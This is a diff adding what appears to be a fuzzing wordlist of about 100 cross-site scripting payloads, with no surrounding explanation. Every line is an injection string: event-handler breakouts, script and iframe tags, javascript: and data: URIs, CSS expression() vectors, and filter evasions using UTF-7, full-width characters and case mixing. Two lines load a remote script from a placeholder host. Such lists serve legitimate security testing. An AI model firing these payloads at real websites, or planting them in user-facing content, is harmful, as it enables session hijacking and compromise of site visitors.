@@ -1,0 +1,100 @@
+ ' onerror=alert(1);'
+ ' onerror=alert`1`;'
+ '; alert(1); //
+ '; alert`1`; //
+ ';\r\nalert(1);//
+ ';\r\nalert`1`;//
+ onerror=alert(1);
+ onmousemove=alert(1); 
+--><script>alert(1);</script>
+--><script>alert`1`;</script>
+;}alert(1);{&#39;
+" /><frame src="javascript:alert(1);"></frameset>
+" onerror=alert(1);"
+" onerror=alert`1`;"
+" onmousemove=alert(1); 
+" onmousemove=alert(1);"
+" onmousemove=alert`1`; 
+" onmousemove=alert`1`;"
+"; alert(1); //
+"; alert`1`; //
+";\r\nalert(1);//
+";\r\nalert`1`;//
+""" style="background:url(javascript:alert(1))" "
+<img src=javascript:alert(1)>
+"<s>"><img src="javascript:alert(1)">
+"<s>"><script>alert(1)</script>
+"></iframe><script>alert(1);</script>
+"></iframe><script>alert`1`;</script>
+"><frame src="javascript:alert(1)">
+"><frame src="javascript:alert`1`">
+"><script>alert(1);</script>
+"><script>alert`1`;</script>
+"onclick="alert(1)"
+"onclick="alert`1`"
+"onclick="alert(1)" "onFocus="alert(1)"
+"onclick="alert`1`" "onFocus="alert`1`"
+"onFocus="alert(1)"
+"onFocusOut="alert(1)"
+"onMouseDown="alert(1)"
+"onMouseEnter="alert(1)"
+"onMouseEnter="alert(1)" "onMouseDown="alert(1)"
+"onMouseLeave="alert(1)"
+"onMouseLeave="alert(1)" "onMouseOut="alert(1)"
+"onMouseMove="alert(1)"
+"onMouseMove="alert(1)" "onFocusOut="alert(1)"
+"onMouseOut="alert(1)"
+"onMouseUp="alert(1)"
+"onMouseWheel="alert(1)"
+"onMouseWheel="alert(1)" "onMouseUp="alert(1)"
+”＞＜ｓｃｒｉｐｔ＞ａｌｅｒｔ（’ＸＳＳ’）＜／ｓｃｒｉｐｔ＞
+*/\r\nalert(1);//
+*/\r\nalert`1`;//
+\r\nalert(1);//
+\r\nalert`1`;//
+<![CDATA["><script>alert(1)</script><!--]]>
+</textarea><img src=x onerror=alert(1);>
+</textarea><img src=x onerror=alert`1`;>
+</textarea><script>alert(1);</script>
+</textarea><script>alert`1`;</script>
+<% onmousemove=alert(1)>
+<% style="xss:expr/* */ession(alert(1))">
+<% style="xss:expression(alert(1))">
+<<script>alert(1);<</script>
+<a onmouseover="alert(1)">XSS</a>
+<a onmouseover=alert(1)>XSS</a>
+<b <script>alert(1)</script>0
+<b>aaaa<script<b></b><alert(1)</script </b>
+<div style='behavior:url(test.sct)'>a</div>
+<div style="color:expression(alert(1));">a</div>
+<div style="left:exp/* */ression(alert(1))">
+<div style="left:expression(alert(1))">
+<div/style="width:expression(alert(1))">x</div>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<iframe src="javascript:alert(1);"></iframe>
+<iframe src="x" style=width:exp/**/ressi/**/on(alert(1))>
+<iframe src=# onmouseover="alert(1)"></iframe>
+<img src="http://www.example.com/>"onerror="alert(1)//<">
+<img src=x onerror=alert(1);>
+<img src=x onerror=alert`1`;>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-7"/>+ADw-script+AD4-alert(1)+ADsAPA-/script+AD4-
+<object data="data:text/html,<script>alert(1)</script>"></object>
+<q/oncopy=alert(1)
+<q/oncut=alert(1)
+<s oncopy= alert(1)>a
+<s oncut= alert(1)>a
+<s><script>alert(1)</script>
+<s>><img src="javascript:alert(1)>
+<script src=http://example.com/xss.js></script>
+<sCriPt src=http://example.com/xss.js></script>
+<script>alert(1);</script>
+<ScrIpt>alert(1);</SCript>
+<script>alert`1`;</script>
+<SELECT NAME="" onmouseover=alert(1)></select>
+><s><img src="javascript:alert(1)>
+a style=background:url(javascript:alert(1)) 
+data:text/html,<script>alert(1)</script>
+javascript:alert(1);
+javascript:alert(1)//
+javascript:alert`1`;
+style=background:url(javascript(1))
